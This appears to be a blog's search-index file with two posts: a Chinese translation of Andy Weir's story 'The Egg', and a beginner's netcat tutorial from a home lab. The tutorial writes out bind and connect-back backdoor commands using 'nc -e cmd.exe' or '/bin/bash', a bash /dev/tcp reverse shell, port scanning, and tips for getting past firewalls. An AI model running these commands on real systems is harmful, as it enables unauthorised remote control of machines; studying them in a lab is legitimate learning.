<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>蛋</title>
    <url>/2019/10/19/%E8%9B%8B/</url>
    <content><![CDATA[<h2 id="作者简介"><a href="#作者简介" class="headerlink" title="作者简介"></a>作者简介</h2><p>安迪威尔：美国作家，《火星救援》小说原著作者，资深太空迷，作者自嘲自己是书呆子，喜欢学习各种新事物，不善交际（他的商业活动基本由经纪人打理），在写《火星救援》时自学了轨道动力学，植物学，航天发展史，火星概况。，。因为写了《火星救援》“The Martian”这部科技小说为世人所知。该小说在亚马逊推到榜首后，于2015年2月又发行了《火星救援》的电影版。2016年8月，安迪·威尔凭借《火星救援》获得了2016年雨果奖的最佳新人作家奖。</p><a id="more"></a>
<h2 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h2><p><img src="/2019/10/19/%E8%9B%8B/%E8%A7%A6%E7%9B%AE%E6%83%8A%E5%BF%83.jpeg" alt="触目惊心"></p>
<p>你死在回家的路上。<br>是车祸。没有很离奇，但依旧致命。你丢下妻子和一双子女。你死得并不痛苦。急救人员尽了最大努力，但回天乏术。你的身体四分五裂，还不如死了，相信我。<br>这时候你看到了我。<br>“怎……怎么回事？”你问，“我在哪？”<br>“你死了，”我直接地说，一点也不委婉。<br>“一辆……一辆卡车，它侧滑了……”<br>“没错，”我说。<br>“我……我死了？”<br>“嗯。但是别难过，人固有一死。”我说。<br>你四下张望，周围一片虚空，只有你我。“这是什么地方？”你问，“这是死后的世界吗？”<br>“可以这么说吧，”我说。<br>“你是上帝吗？”你问。<br>“是的，”我答，“我是上帝。”<br>“我的孩子们……还有我太太，”你说。<br>“他们怎么了？”<br>“他们会没事吗？”<br>“这一点我喜欢，”我说，“你刚死，却牵挂著你的家庭。这在这里是好事。”<br>你痴痴地看著我。对你来说我看起来不像上帝，只像一个平常人，也可能是女人。一个模糊的权威形象，可能吧，比起万能的上帝，更像是一个中学老师。<br>“别担心，”我说，“他们都会没事的。你在你孩子的记忆中会是完美无缺的，他们还没长到蔑视你的年龄。你太太会在人前恸哭，私下里却如释重负。平心而论，你的婚姻已经分崩离析。她会对这种如释重负的心情感到罪恶，如果这对你算是一点安慰。”<br>“哦，”你说，“那么现在呢？我是上天堂还是下地狱或者去别的什么地方？”<br>“都不是，”我说，“你会去转世。”<br>“啊，”你说，“所以印度教是对的。”<br>“宗教都以不同的方式合理著，”我说，“跟我走。”<br>你跟著我在虚空中穿行，“我们去哪里？”<br>“不去哪里，”我说，“我们边说边走走就好。”<br>“那意义何在？”你问，“我转世后，我又会变成白板一块，对吧？ 一个婴儿。此生中我经历的一切，我做的事，都不再有所谓。”<br>“也并非如此！”我说，“所有你前世的知识和经验，都伴随著你。只是此刻你并不记得。”<br>我停下来握住你的肩膀，“你的灵魂远比你所想的要壮观、美丽和宏大。一个人脑只能承载你的很小很小一部分。就像用一个指头试探一杯水的凉热。你只需投入你的一小部分到这个容器之中，将其取出之后，就获得了它所有的智识。<br>“你刚为人四十八年，还没来得及伸展自己，感受你巨大意识的其他部分。如果我们在此逗留时间够长，你就会开始想起所有事。不过我们没必要在每世之间这么做。”<br>“那我到现在转世多少次了？”<br>“噢，很多。很多很多。很多不同的人生。”我说，“下面这一世，你会是公元540年的一个中国的农家女孩。”<br>“等等，什么？”你结结巴巴地问，“你要把我送到过去？”<br>“嗯……理论上是吧。你理解的时间只存在于你的宇宙。我来的地方和你那里是不一样的。”<br>“那你从哪里来的？”你问。<br>“这样的，”我解释道，“我来自某处。在别的地方，那里也有像我这样的。我知道你想知道那里是什么样的，但老实说，你不会理解的。”<br>“哦，”你有点沮丧，“但是等等，如果我可以转世到其他时间，就说明某些情况下我可以遇到我自己。”<br>“当然。这是一直都有的事。但每世都只有自己那一段生命的记忆，所以你们相遇的时候，你自己是毫无察觉的。”<br>“那这一切到底意义何在？”<br>“你是认真的吗？”我问，“不是在开玩笑？你在问我生命的意义？不觉得有点老套了吗？”<br>“这也是个合理的问题。”你坚持道。<br>我看著你的眼睛，“生命的意义，我为你创造这整个宇宙的原因，在于为了让你成熟。”<br>“你是说全人类？你希望我们成熟？”<br>“不，就是你。我为你创造了整个宇宙。每一世你都成长，变得更成熟，拥有更大更好的宗智慧。 ”<br>“只有我？那其他人呢？”<br>“没有其他人，”我说，“在这个宇宙中，只有你和我。”<br>你茫然地瞪著我，“但这世界上所有其他人……”<br>“都是你。都是你不同的转世。”<br>“等等！我是所有人！”<br>“现在你明白了，”我说，拍拍你的背表示祝贺。<br>“每个曾活在这个世界上的人都是我？”<br>“现在活著的也是。”<br>“我是亚伯拉罕·林肯？”<br>“你同时也是约翰·威尔克斯·布斯，”我补充道。<br>“我是希特勒？”你骇然道。<br>“你也是他杀害的千百万人。”<br>“我是耶稣？”<br>“你也是他的所有信徒。”<br>你陷入沉默。<br>“每一次你伤害他人，”我说，“都是在伤害自己。每一次你行善举，都是在帮助自己。他人经历过或即将经历的一切快乐和痛苦，你都会经历。”<br>你思索了很久。<br>“为什么？”你问我，“为什么要做这些？”<br>“因为有一天，你会成为我。因为这就是你。你是我的同类，你是我的孩子。”<br>“哇，”你难以置信，“你是说我是一个上帝？”<br>“现在还不是。你是一个胚胎。你还在成长。当你经历了所有时间里所有人的一生，你就足够成熟，可以出生了。”<br>“所以这整个宇宙，”你说，“只是一个……”<br>“一个蛋，”我答，“现在该是你去下一世的时候了。”<br>然后，我送你上了路。</p>
]]></content>
      <categories>
        <category>短篇</category>
      </categories>
      <tags>
        <tag>安迪威尔 科幻</tag>
      </tags>
  </entry>
  <entry>
    <title>netcat的简单使用</title>
    <url>/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/</url>
    <content><![CDATA[<h1 id="关于netcat的简单使用报告"><a href="#关于netcat的简单使用报告" class="headerlink" title="关于netcat的简单使用报告"></a>关于netcat的简单使用报告</h1><h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.背景介绍"></a>1.背景介绍</h2><p> 在网络工具中，具有“瑞士军刀”美誉的net cat。是一个简单易用的基于tcp/ip协议（c/s模型）的“瑞士军刀”。</p><a id="more"></a>
<h2 id="2-使用范围"><a href="#2-使用范围" class="headerlink" title="2.使用范围"></a>2.使用范围</h2><p>针对功能强大的的netcat展开，我将以图文的方式讲解netcat基本使用、命令参数、文件传输、建立后门、端口转发、实现内外网突破。</p>
<h2 id="3-使用场景"><a href="#3-使用场景" class="headerlink" title="3.使用场景"></a>3.使用场景</h2><p>客户端连接防火墙被拒绝，但防火墙的过滤机制并不能过滤服务器外联产生的流量，此时将会于客户端连接,装备nc的客户端将会成为nc的服务端，而连接的服务端就成为了nc的客户端，达到突破网络限制的目的。</p>
<h2 id="4-具体使用"><a href="#4-具体使用" class="headerlink" title="4.具体使用"></a>4.具体使用</h2><h3 id="1-基础使用方法"><a href="#1-基础使用方法" class="headerlink" title="1.基础使用方法"></a>1.基础使用方法</h3><h4 id="（1）创建一个服务器端方法"><a href="#（1）创建一个服务器端方法" class="headerlink" title="（1）创建一个服务器端方法"></a>（1）创建一个服务器端方法</h4><p><code>nc -l -p [localport]</code></p>
<h4 id="2-创建一个客户端方法（连接服务端）"><a href="#2-创建一个客户端方法（连接服务端）" class="headerlink" title="(2)   创建一个客户端方法（连接服务端）"></a>(2)   创建一个客户端方法（连接服务端）</h4><p><code>-nc [remote_addr] [remoteport]</code></p>
<h4 id="（3）实例演示1"><a href="#（3）实例演示1" class="headerlink" title="（3）实例演示1"></a>（3）实例演示1</h4><p>通过这样一个过程，仅实现一个简单的通信系统，并不能对机器进行命令执行。下图为实例，我在Windows系统下创建一个服务器端</p>
<p>并在kali中创建一个客户端，使用nc的方式进行连接，完成了基本</p>
<p>的对话。</p>
<p><img src="/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8.png" alt="基础使用"></p>
<h4 id="（4）返回shell的使用方法"><a href="#（4）返回shell的使用方法" class="headerlink" title="（4）返回shell的使用方法"></a>（4）返回shell的使用方法</h4><p><strong>1.创建一个服务器端的方法：</strong></p>
<p><code>nc -l -p [localport] -e cmd.exe</code></p>
<p>注释：这里-e的意义是连接之后要返回给连接端对应的程序。</p>
<p><strong>2.创建一个客户端方法（连接服务端）</strong></p>
<p><code>nc  [remote_addr]   [remoteport]</code></p>
<h4 id="5-实例演示2"><a href="#5-实例演示2" class="headerlink" title="(5)  实例演示2"></a>(5)  实例演示2</h4><p>windows下创建一个服务端，并用kali连接即可获得windows的命令行。。。我用来查看了Windows系统下的ip地址和桌面文件，这是相当可怕的。其中的乱码应该是ut)f-8码。</p>
<p><img src="/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E5%8F%8D%E5%BC%B9shell1.png" alt="反弹shell1"></p>
<h3 id="2-文件传输"><a href="#2-文件传输" class="headerlink" title="2.文件传输"></a>2.文件传输</h3><h4 id="（1）使用场景"><a href="#（1）使用场景" class="headerlink" title="（1）使用场景"></a>（1）使用场景</h4><p><strong>1.取证</strong></p>
<p>当目标被黑客攻击后，取证人员可以利用nc的文件传输功能来获取目标机器上的文件内容。避免直接在目标机器上进行操作造成取证的误差。</p>
<p><strong>2.单纯获取目标机器敏感文件</strong></p>
<p>当目标机器上有一些文件内容，无法正常下载是，可以利用nc进行文件传输。</p>
<p><strong>注释</strong>：nc中的数据传输，使用的是标准输入输出流。所以可以直接用命令行进行操作。</p>
<h4 id="（2）-文件传输使用方法"><a href="#（2）-文件传输使用方法" class="headerlink" title="（2） 文件传输使用方法"></a>（2） 文件传输使用方法</h4><p><strong>1.创建一个服务器端方法</strong></p>
<p><code>nc -l -p [localport] &gt; outfile</code></p>
<p>注释：这里outfile表示接收文件</p>
<p><strong>2.创建一个客户端方法（连接服务端）</strong></p>
<p>-nc   [remote_addr]    [remoteport]   &lt; infile</p>
<h4 id="3-实例演示"><a href="#3-实例演示" class="headerlink" title="(3)  实例演示"></a>(3)  实例演示</h4><p>提前建立好一个内容为hudhaiuh的flag.txt文件，并用两个终端分别模拟客户端与服务端，传输成功！</p>
<p><img src="/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93.png" alt="文件传输"></p>
<!--*****这里不仅仅局限于客户端向服务端发送文件，服务器端建立端口随时向连接的客户端发送文件也是类似的方法，不再赘述。*-->

<h4 id="（4）文件传输遇到的问题"><a href="#（4）文件传输遇到的问题" class="headerlink" title="（4）文件传输遇到的问题"></a>（4）文件传输遇到的问题</h4><p>如果此时服务端并没有准备好连接，而客户端已经使用nc进行连接，那么客户端会一直等待下去，直到连接上服务端，造成一种nc“假死”的状态。</p>
<h4 id="（5）解决方法"><a href="#（5）解决方法" class="headerlink" title="（5）解决方法"></a>（5）解决方法</h4><p>可以设置等待时间。</p>
<p><code>nc    w3  [ip]    [port]</code>    w3的意思是设置3秒的等待时间，超过三秒钟，客户端直接关闭等待连接，，，，感受到了这个程序的温暖。</p>
<h3 id="3-信息探测"><a href="#3-信息探测" class="headerlink" title="3.信息探测"></a>3.信息探测</h3><h4 id="（1）使用场景-1"><a href="#（1）使用场景-1" class="headerlink" title="（1）使用场景"></a>（1）使用场景</h4><p><strong>1.目标内网的扫描</strong></p>
<p>当获得目标权限侯，如果目标没有任何途径可以对内网进行探测，二此时刚好具有一个netcat的话，就可以使用netcat进行内网IP和端口的扫描。</p>
<p><strong>2.单纯对某个目标进行端口探测</strong></p>
<p>当手头没有任何探测工具时。。。</p>
<p><strong>3.对目标服务的服务banner进行抓取</strong></p>
<p>当你需要抓取banner时。搞渗透嘛，当然信息越多越好。</p>
<p><strong>注释</strong>：banner信息表示欢迎语，其中会包含一些敏感信息，所以获取banner也属于信息搜集的范畴。在渗透测试中，典型的4xx,5xx信息泄露就属于banner泄露的一种。在banner信息中，可以获取到软件开发商、软件名称、服务类型、版本号等。而版本号有时候就会存在于公开的CVE问题，可以直接利用。</p>
<h4 id="（2）端口扫描使用方法"><a href="#（2）端口扫描使用方法" class="headerlink" title="（2）端口扫描使用方法"></a>（2）端口扫描使用方法</h4><p><code>nc -v -n -z -w1 [target_ip] [start_port-stop_port]</code></p>
<p><strong>注释：</strong>-v  表示对错误进行详细输出</p>
<p>​           -n   不对目标进行DNS解析</p>
<p>​           -z    zero   I/O  模式，专用于端口扫描。表示对目标ip发送的<strong>数据表</strong>中不包含任何的payload,这样做可以加快扫描的速度。</p>
<h4 id="（3）实例演示1-1"><a href="#（3）实例演示1-1" class="headerlink" title="（3）实例演示1"></a>（3）实例演示1</h4><p> 先查看该虚拟机的IP地址，然后分别扫描1-1000，1-65535  端口，速度非常之快，如图    </p>
<p><img src="/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F.png" alt="端口扫描"></p>
<h4 id="（4）Banner抓取使用方法"><a href="#（4）Banner抓取使用方法" class="headerlink" title="（4）Banner抓取使用方法"></a>（4）Banner抓取使用方法</h4><p><code>echo  &quot; &quot;  |  nc -v -n -w1 [target_ip]  [start_port-stop_port]</code></p>
<h4 id="5-实例演示2-1"><a href="#5-实例演示2-1" class="headerlink" title="(5)   实例演示2"></a>(5)   实例演示2</h4><p>写到这里蜜汁尴尬，开放的端口里并没有banner信息。。。无妨。你相信有就有。</p>
<p><img src="/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E8%8E%B7%E5%8F%96banner.png" alt="获取banner"></p>
<h3 id="4-建立后门"><a href="#4-建立后门" class="headerlink" title="4.建立后门"></a>4.建立后门</h3><h4 id="（1）使用场景-2"><a href="#（1）使用场景-2" class="headerlink" title="（1）使用场景"></a>（1）使用场景</h4><p>1.获取目标的命令执行权限</p>
<p>当目标机器上存在netcat之后，可以使用netcat建立后门，来实现执行目标命令的功能。原理：标准输入输出流，</p>
<h4 id="（2）Windows建立后门使用方法"><a href="#（2）Windows建立后门使用方法" class="headerlink" title="（2）Windows建立后门使用方法"></a>（2）Windows建立后门使用方法</h4><p><strong>1.监听型后门</strong></p>
<p><code>nc -l -p 4444 -e cmd.exe</code></p>
<p>用来监听4444端口。这是表示客户端监听了服务端的4444，如果被黑客利用，则后果不堪设想。</p>
<p><strong>2.连接型后门</strong></p>
<p><code>nc [remote_ip] [remote_port] -e cmd.exe</code></p>
<p>连接型后门表示服务端通过连接客户端以获得客户端的命令行。</p>
<h4 id="（3）实例演示"><a href="#（3）实例演示" class="headerlink" title="（3）实例演示"></a>（3）实例演示</h4><p>我只是简单的用kali创建了一个服务端，用windows一连接命令行就被获取。</p>
<p><img src="/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E7%9B%91%E5%90%AC%E5%9E%8B%E5%90%8E%E9%97%A8.png" alt="监听型后门"></p>
<p>当然，无论是哪种后门，都需要使用-额cmd.exe 来返回对应的cmd.exe.</p>
<h4 id="（4）linux下建立后门使用方法"><a href="#（4）linux下建立后门使用方法" class="headerlink" title="（4）linux下建立后门使用方法"></a>（4）linux下建立后门使用方法</h4><p><strong>1.监听型后门</strong></p>
<p><code>nc  -l  -p  port  -e  /bin/bash</code></p>
<p><strong>2.连接型后门</strong></p>
<p><code>nc  -[remote_ip]  [remote_port]  -e  /bin/bash</code></p>
<p><strong>注释：</strong>理论与方法均与Windows系统下一样，只是命令有细微区别，这里不做实例。</p>
<h3 id="5-连接转发"><a href="#5-连接转发" class="headerlink" title="5.连接转发"></a>5.连接转发</h3><h4 id="（1）简单介绍"><a href="#（1）简单介绍" class="headerlink" title="（1）简单介绍"></a>（1）简单介绍</h4><p>  在内网渗透相关的文章中经常会听到“端口转发”这个名词，但并不太确定具体是什么，现在看来和NAT、端口映射是一个意思。</p>
<p>更具体而言，端口转发程序用于跳板机器上，可解决攻击机与目标机网络不通的问题；端口转发程序用于目标机上，可以解决攻击机与目标机网络通但具体服务端口被目标机防火墙限制的问题。</p>
<p>客户端&lt;—-&gt;转发程序&lt;—-&gt;目标服务（&lt;—-&gt;表示网络连接）</p>
<h4 id="（2）使用场景"><a href="#（2）使用场景" class="headerlink" title="（2）使用场景"></a>（2）使用场景</h4><p>有时候我们需要突破某些特殊情况下的连接限制，以及处理一些特殊情况。</p>
<h4 id="（3）连接转发的使用方法"><a href="#（3）连接转发的使用方法" class="headerlink" title="（3）连接转发的使用方法"></a>（3）连接转发的使用方法</h4><p><code>echo nc [target] [port] &gt; delay.bat</code></p>
<p><code>echo nc [localport] -e delay.bat</code></p>
<p>当有客户端连接该服务端时，连接的客户端通过服务端连接到target  port上，实现了连接转发功能。（端口转发）</p>
<p><strong>注释</strong>：delay.bat为windows下的批处理文件。</p>
<h4 id="（4）实例演示"><a href="#（4）实例演示" class="headerlink" title="（4）实例演示"></a>（4）实例演示</h4><p>我将用windows系统下的pc作为客户端，同一网段的kalilinux会以服务端1的身份与之连接，然后达到与服务端2，另一台外网上kaliLinux连接的目的。</p>
<p>因另一台外网虚拟机出了点问题没有截图，实例以后补上。。。</p>
<h3 id="5-反弹shell"><a href="#5-反弹shell" class="headerlink" title="5.反弹shell"></a>5.反弹shell</h3><h4 id="1-使用场景"><a href="#1-使用场景" class="headerlink" title="(1)使用场景"></a>(1)使用场景</h4><p>某些拿到服务器权限后，想要设置一个反弹shell。但是目标服务器上没有装netcat时。</p>
<h4 id="（2）反弹shell的使用方法"><a href="#（2）反弹shell的使用方法" class="headerlink" title="（2）反弹shell的使用方法"></a>（2）反弹shell的使用方法</h4><p><strong>1.反弹shell的命令:</strong></p>
<p><code>bash  -i  &gt;&amp;  /dev/tcp/ip/port  0&gt;&amp;1</code></p>
<p><strong>2.PC接受net cat命令：</strong></p>
<p><code>nc -lvp port</code></p>
<p><strong>注释：</strong>bash  -i表示已交互运行bash shell.</p>
<p>​           文件描述符：0标准输入</p>
<p>​                                  1标准输出</p>
<p>​                                  2错误输入输出</p>
<p>​            那么命令中0&gt;&amp;1表示将标准输入重定向到标准输出。</p>
<h4 id="3-实例演示-1"><a href="#3-实例演示-1" class="headerlink" title="(3)实例演示"></a>(3)实例演示</h4><p>我使用Windows监听4444端口，假设我的kali linux没有安装nc(实际已安装，不过问题不大)，在kali上输入反弹的命令，很轻松拿到shell!</p>
<p><img src="/2019/10/17/%E5%85%B3%E4%BA%8Enetcat%E7%9A%84%E4%BD%BF%E7%94%A8%E6%8A%A5%E5%91%8A/%E5%8F%8D%E5%BC%B9shell.png" alt="反弹shell"></p>
<p>此外还有python的方法反弹shell,当然前提是目标机上安装了python,对python还不是很了解，所以缺口待补。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>nc其实有许许多多的用法，这里只是使用了一部分，但我已经感受到了他的强大与可怕，无愧网络瑞士军刀。</p>
<p>车到山头必有路，没事多用用nc   -h，你会发现新大陆。完。</p>
<p>​                                                                                                                                                        —-扬州墨客</p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>工具 网络瑞士军刀</tag>
      </tags>
  </entry>
</search>
